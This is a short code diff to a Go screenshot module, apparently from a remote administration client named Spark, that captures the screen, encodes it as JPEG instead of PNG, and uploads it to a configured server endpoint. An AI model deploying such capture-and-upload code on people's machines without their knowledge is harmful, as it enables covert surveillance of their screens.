@@ -3,12 +3,12 @@
 package screenshot
 
 import (
+	"Spark/client/common"
 	"Spark/client/config"
 	"bytes"
 	"errors"
-	"github.com/imroc/req/v3"
 	"github.com/kbinani/screenshot"
-	"image/png"
+	"image/jpeg"
 )
 
 func GetScreenshot(bridge string) error {
@@ -22,11 +22,11 @@ func GetScreenshot(bridge string) error {
 	if err != nil {
 		return err
 	}
-	err = png.Encode(writer, img)
+	err = jpeg.Encode(writer, img, &jpeg.Options{Quality: 80})
 	if err != nil {
 		return err
 	}
 	url := config.GetBaseURL(false) + `/api/bridge/push`
-	_, err = req.R().SetBody(writer.Bytes()).SetQueryParam(`bridge`, bridge).Put(url)
+	_, err = common.HTTP.R().SetBody(writer.Bytes()).SetQueryParam(`bridge`, bridge).Put(url)
 	return err
 }
